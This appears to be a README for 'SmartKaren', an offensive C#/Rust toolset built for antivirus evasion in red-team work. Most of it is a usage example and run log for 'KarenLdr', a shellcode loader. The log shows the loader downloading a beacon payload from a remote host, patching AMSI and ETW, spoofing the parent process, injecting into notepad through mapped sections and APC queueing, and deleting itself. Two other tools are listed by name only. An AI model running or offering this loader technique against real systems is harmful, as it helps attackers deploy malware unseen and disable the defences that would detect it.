# SmartKaren
A series of custom offensive toolset and utilities written in C# and Rust. This project is developed to explore AV evasion techniques for aiding red teaming operations. 

## KarenLdr
```
C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 -k 
     _        _______  _______  _______  _        _        ______   _______
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|( \      (  __  \ (  ____ )
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (      | (  \  )| (    )|
    |  (_/ / | (___) || (____)|| (__    |   \ | || |      | |   ) || (____)|
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |      | |   | ||     __)
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |      | |   ) || (\ (
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (____/\| (__/  )| ) \ \__
    |_/    \/|/     \||/   \__/(_______/|/    )_)(_______/(______/ |/   \__/

 KarenLdr: D/Invoke + NT*API + Manual Mapping + Direct Syscall + AMSI & ETW Patching + PPID Spoofing

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -s, --syscall  Enable Direct Syscall. Default: Manual Mapping

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : https://192.168.231.128:443/beacon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 9524
| Self Destruct : True
|--------------

[>] Patching Event Tracing for Windows (ETW)
    |-> Address of ntdll.dll: 0x7FFD8DEF0000
    |-> Location of EtwEventWrite(): 0x7FFD8DF3F1F0
    |-> Patching Memory: 0x00000020 -> 0x04
    |-> Restoring Memory: 0x04 -> 0x00000020

[>] Patching Anti Malware Scan Interface (AMSI)
    |-> Address of AmsiScanBuffer(): 0x7FFD75B83860
    |-> Successfully Patched AMSI!

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 22232

[>] Fetching Payload
    |-> Payload Retrieved Successfully!

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7ffd8def0000
    |-> New copy of ntdll.dll: 0x29cb56e0000

[>] NtCreateSection()
    |-> New Section Created!

[>] NtMapViewOfSection()
    |-> New Section Mapped!

[>] Copied Shellcode to Memory!

[>] NtMapViewOfSection()
    |-> Memory Region Mapped to Target Process!
    |-> Base Address: 0x209ED370000

[>] NtQueueApcThread()
    |-> Queueing APC!

[>] NtSetInformationThread()
    |-> Thread Priority Set!

[>] NtResumeThread()
    |-> Resuming Thread!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] KarenLdr.exe removed from disk!
```

## KarenDumpedMi

## Karen2Gadget
